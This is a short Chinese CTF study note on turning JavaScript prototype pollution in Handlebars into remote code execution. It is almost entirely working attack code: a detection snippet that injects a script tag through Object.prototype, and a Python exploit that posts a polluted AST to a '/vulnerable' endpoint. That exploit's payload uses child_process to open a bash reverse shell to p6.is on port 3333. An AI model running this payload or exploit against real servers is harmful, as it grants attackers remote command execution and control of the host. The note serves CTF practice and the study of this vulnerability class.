tags:: [[CTFWEB/JS/原型链污染]]

- # 原型链污染到RCE
	- 检测是否存在：
		- ```js
		  const Handlebars = require('handlebars');
		  
		  Object.prototype.pendingContent = `<script>alert(origin)</script>`
		  
		  const source = `Hello {{ msg }}`;
		  const template = Handlebars.compile(source);
		  
		  console.log(template({"msg": "posix"})); // <script>alert(origin)</script>Hello posix
		  ```
	- ```python
	  import requests
	  
	  TARGET_URL = 'http://p6.is:3000'
	  
	  # make pollution
	  requests.post(TARGET_URL + '/vulnerable', json = {
	      "__proto__.type": "Program",
	      "__proto__.body": [{
	          "type": "MustacheStatement",
	          "path": 0,
	          "params": [{
	              "type": "NumberLiteral",
	              "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
	          }],
	          "loc": {
	              "start": 0,
	              "end": 0
	          }
	      }]
	  })
	  
	  # execute
	  requests.get(TARGET_URL)
	  ```
	- [参考](https://po6ix.github.io/AST-Injection/#Example)